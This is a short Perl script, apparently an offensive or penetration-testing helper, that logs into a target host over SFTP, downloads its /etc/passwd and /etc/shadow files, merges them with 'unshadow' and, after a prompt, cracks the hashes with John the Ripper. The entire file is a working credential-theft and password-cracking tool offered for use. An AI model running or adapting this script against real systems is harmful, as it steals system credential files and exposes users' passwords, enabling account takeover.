#!/usr/bin/perl
use strict;
use warnings;
use Net::SFTP::Foreign::Compat ':supplant'; # Note: If this fails, install cpanm and Net::SFTP::Foreign.

require("./scripts.pm");
our(@TARGET, @OUTFOLDER);

my $in = "";


if ((! -e "./@OUTFOLDER/passwd") or (! -e "./@OUTFOLDER/shadow") ){
	print("Connect to them.\n");
	my $sftp = Net::SFTP->new(@TARGET);

	print("Download some cool files!\n");
	$sftp->get("/etc/passwd", "./@OUTFOLDER/passwd") or die "get failed:" . $sftp->error;
	$sftp->get("/etc/shadow", "./@OUTFOLDER/shadow") or die "get failed:" . $sftp->error;
}
else {
	print("Files already exist.\n");
}


print("Format the files for john.\n");
system("unshadow ./@OUTFOLDER/passwd ./@OUTFOLDER/shadow > ./@OUTFOLDER/passwords.txt");

print("Crack passwords?\n > ");

if(<STDIN> =~ /^[yY]/) {
	print("CRACK THE PASSWORDS!\n");
	system("john ./@OUTFOLDER/passwords.txt");
}


